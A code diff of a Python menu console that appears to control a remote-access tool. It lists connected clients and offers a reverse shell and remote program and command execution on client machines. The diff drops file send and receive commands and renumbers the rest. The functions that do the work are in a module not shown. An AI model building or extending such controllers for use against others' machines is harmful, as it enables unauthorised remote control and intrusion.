@@ -4,7 +4,7 @@ from front import admin
 
 stayInProgram=True
 res=False
-commands = ['help','listClients','popShell', 'sendFile', 'reciveFile', 'execProgram','runComand', 'testServer', 'testClient','exit']
+commands = ['help','listClients','popShell', 'execProgram','runComand', 'testServer', 'testClient','exit']
 
 exit = len(commands) - 1
 
@@ -17,13 +17,11 @@ while stayInProgram :
         "0 - help" + "\n" +
         "1 - listClients" +  "\n" +
         "2 - popShell"  + "\n" +
-        "3 - sendFile"  + "\n" +
-        "4 - reciveFile"  + "\n" +
-        "5 - execProgram" +  "\n" +
-        "6 - runComand"  + "\n" +
-        "7 - testServer"  + "\n" +
-        "8 - testClient"  + "\n" +
-        "9 - exit"  + "\n"
+        "3 - execProgram" +  "\n" +
+        "4 - runComand"  + "\n" +
+        "5 - testServer"  + "\n" +
+        "6 - testClient"  + "\n" +
+        "7 - exit"  + "\n"
     )
     command = exit;
 
@@ -44,19 +42,17 @@ while stayInProgram :
         "0 - help: describe the program and the commands of program " "\n\n" +
         "1 - listClients: list full clients." + "\n\n" + 
         "2 - popShell: runs a reverse shell." + "\n\n" + 
-        "3 - sendFile: send a file to the client." + "\n\n" + 
-        "4 - reciveFile: pull file from client." + "\n\n" + 
-        "5 - execProgram: executable runs on the client machine." + "\n\n" + 
-        "6 - runComand: run a command on the client machine."  + "\n\n" +
-        "7 - testServer: tests the connection to the server."  + "\n\n" +
-        "8 - testClient: tests the connection on the client machine."  + "\n\n" +
-        "9 - exit: disconnects of the server."  + "\n"
+        "3 - execProgram: executable runs on the client machine." + "\n\n" + 
+        "4 - runComand: run a command on the client machine."  + "\n\n" +
+        "5 - testServer: tests the connection to the server."  + "\n\n" +
+        "6 - testClient: tests the connection on the client machine."  + "\n\n" +
+        "7 - exit: disconnects of the server."  + "\n"
     )
 
     elif (command == 1): #listClients
         try:
             if not (master.displayClients()):
-               raise master
+               raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
 
@@ -64,7 +60,7 @@ while stayInProgram :
     elif (command == 2): #popShell
         try:
             if not (master.displayClients()):
-                raise master
+                raise Exception("Não achado\n")
 
             client = int(input("What client?"))
             print("\n")
@@ -74,46 +70,15 @@ while stayInProgram :
             print("\n")
 
             if not (master.abrirShell(client,addres,port)):
-                raise master
-        except:
-            print("Returned Error!!")
-
-    elif (command == 3): #sendFile
-        try:
-            if not (master.displayClients()):
-                raise master
-            
-            client = int(input("What client?"))
-            print("\n")
-            file = input("what file?")
-            print("\n")
-
-            if not (master.sendFile(file,client)):
-                raise master
+                raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
 
 
-    elif (command == 4): #reciveFile
+    elif (command == 3): #execProgram
         try:
             if not (master.displayClients()):
-                raise master
-            
-            client = int(input("What client?"))
-            print("\n")
-            file = input("what file?")
-            print("\n")
-
-            if not (master.downloadFile(file,client)):
-                raise master
-        except:
-            print("Returned Error!!")
-
-
-    elif (command == 5): #execProgram
-        try:
-            if not (master.displayClients()):
-                raise master
+                raise Exception("Não achado\n")
             
             client = int(input("What client?"))
             print("\n")
@@ -121,43 +86,43 @@ while stayInProgram :
             print("\n")
 
             if not (master.executeProgram(program,client)):
-                raise master
+                raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
 
 
-    elif (command == 6): #runComand
+    elif (command == 4): #runComand
         try:
             if not (master.displayClients()):
-                raise master
+                raise Exception("Não achado\n")
             
             client = int(input("What client?"))
             print("\n")
             comd = input("what command?")
             print("\n")
 
-            if not (master.executeProgram(comd,client)):
-                raise master
+            if not (master.runCommand(comd,client)):
+                raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
     
-    elif (command == 7): #testServer
+    elif (command == 5): #testServer
         try:
             if not(master.testServer()):
-                raise master
+                raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
     
-    elif (command == 8): #testClient
+    elif (command == 6): #testClient
         try:
             if not (master.displayClients()):
-                raise master
+                raise Exception("Não achado\n")
             
             client = int(input("What client?"))
             print("\n")
 
-            if not(master.testClient()):
-                raise master
+            if not(master.testClient(client)):
+                raise Exception("Não achado\n")
         except:
             print("Returned Error!!")
 
@@ -176,5 +141,5 @@ while stayInProgram :
         print("Finish the program")
 
 
-#{listClients:ok,popShell:no,sendFile:no,reciveFile:no,execProgram:no,install:no,runComand:no,testServer:ok,testeClient:ok}
-#lC:ok,pS:n,sF:n,rF:n,eP:n,i:n,rC:n,tS:ok,tC:ok
+#{listClients:ok,popShell:ok,execProgram:no,runComand:ok,testServer:ok,testeClient:ok}
+#lC:ok,pS:ok,eP:n,rC:ok,tS:ok,tC:ok ouvir:no
